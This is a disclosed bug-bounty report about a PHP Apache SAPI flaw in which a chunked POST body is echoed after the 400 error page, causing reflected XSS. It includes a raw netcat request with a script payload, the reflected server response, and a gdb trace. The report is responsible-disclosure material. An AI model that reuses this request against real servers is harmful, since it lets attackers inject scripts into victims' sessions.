# Improper handling of Chunked data request in sapi_apache2.c leads to Reflected XSS

## Report Details
- **Report ID**: 409986
- **URL**: https://hackerone.com/reports/409986
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-09-15T04:40:29.149Z
- **Disclosed**: 2018-10-02T06:16:06.703Z

## Reporter
- **Username**: cymtrick
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Hey,
Chunked requests can trigger xss and  html injection at any end point because the APR_BRIGADE_INSERT_TAIL(brigade, bucket) is getting destroyed by other handlers.
Affected versions: Any
OS: Any
https://bugs.php.net/bug.php?id=76

````
Prashanths-MacBook-Pro:~ prashanthvarma$ nc localhost 80
POST /lol.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Transfer-Encoding: chunked
Content-Length: 25

<script>alert(1)</script>HTTP/1.1 400 Bad Request
Date: Mon, 09 Jul 2018 06:08:22 GMT
Server: Apache/2.4.33 (Unix) PHP/7.1.17
Content-Length: 226
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
</body></html>
 <script>alert(1)</script>
````
````
#1  0x00007f511550494a in apr_socket_sendv (sock=sock@entry=0x7f5115c230a0, vec=vec@entry=0x7fffa5bf4f80, nvec=nvec@entry=3,
    len=len@entry=0x7fffa5bf4ee0) at ./network_io/unix/sendrecv.c:212
#2  0x0000557484512389 in writev_nonblocking (s=s@entry=0x7f5115c230a0, vec=0x7fffa5bf4f80, nvec=3, bb=0x7f5115c23910,
    cumulative_bytes_written=0x7f5115c23848, c=0x7f5115c23290) at core_filters.c:787
#3  0x0000557484512684 in send_brigade_nonblocking (s=s@entry=0x7f5115c230a0, bb=bb@entry=0x7f5115c23910,
    bytes_written=bytes_written@entry=0x7f5115c23848, c=c@entry=0x7f5115c23290) at core_filters.c:704
#4  0x00005574845133c1 in send_brigade_blocking (c=0x7f5115c23290, bytes_written=0x7f5115c23848, bb=0x7f5115c23910, s=0x7f5115c230a0)
    at core_filters.c:733
#5  ap_core_output_filter (f=0x7f5115c236e8, new_bb=0x7f5115c23910) at core_filters.c:542
#6  0x000055748452ff61 in ap_process_request (r=r@entry=0x7f5115c050a0) at http_request.c:477

(gdb) p vec[2]
$4 = {iov_base = 0x7f5115c1b17b, iov_len = 27}
(gdb) p (char *)0x7f5115c1b17b
$5 = 0x7f5115c1b17b "<script>alert(1)</script>\r\n"
````
Made public on [13 sep 2018](https://bugs.php.net/bug.php?id=76582)

## Impact

XSS, session hijacking, HTML injection, information disclosure.

## Attachments
No attachments
